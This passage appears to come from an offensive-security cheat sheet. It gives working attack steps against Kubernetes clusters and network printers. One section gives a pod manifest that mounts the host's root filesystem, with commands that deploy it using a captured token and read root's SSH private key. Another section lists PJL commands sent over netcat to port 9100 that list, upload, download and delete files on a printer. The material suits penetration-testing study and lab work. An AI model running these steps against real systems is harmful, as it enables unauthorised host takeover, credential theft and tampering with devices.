  ubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list
  ```

  Given the privileges:

  - **Create**: create a pod &rarr; create a `YAML` file  to create a new container and mount the entire root filesystem

    ```yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: privesc
      namespace: default
    spec:
      containers:
      - name: privesc
        image: nginx:1.14.2
        volumeMounts:
        - mountPath: /root
          name: mount-root-into-mnt
      volumes:
      - name: mount-root-into-mnt
        hostPath:
           path: /
      automountServiceAccountToken: true
      hostNetwork: true
    ```

    Create the POD with the file:

    ```bash
    kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml
    # Check if running
    kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
    # Run commands
    kubeletctl --server <IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
    ```

## 9100 - Raw Printing

Raw port 9100 printing, also referred to as JetDirect, AppSocket or PDL-datastream actually **is not a printing protocol by itself**. Instead **all data sent is directly processed by the printing device**, just like a parallel connection over TCP.

**Enumeration**

```bash
nc -vn <IP> 9100
@PJL INFO STATUS      #CODE=40000   DISPLAY="Sleep"   ONLINE=TRUE
@PJL INFO ID          # ID (Brand an version)
@PJL INFO PRODINFO    #Product info
@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535  #List dir
@PJL INFO VARIABLES   #Env variales
@PJL INFO FILESYS     #?
@PJL INFO TIMEOUT     #Timeout variables
@PJL RDYMSG           #Ready message
@PJL FSINIT
@PJL FSDIRLIST
@PJL FSUPLOAD         #Useful to upload a file
@PJL FSDOWNLOAD       #Useful to download a file
@PJL FSDELETE         #Useful to delete a file
```





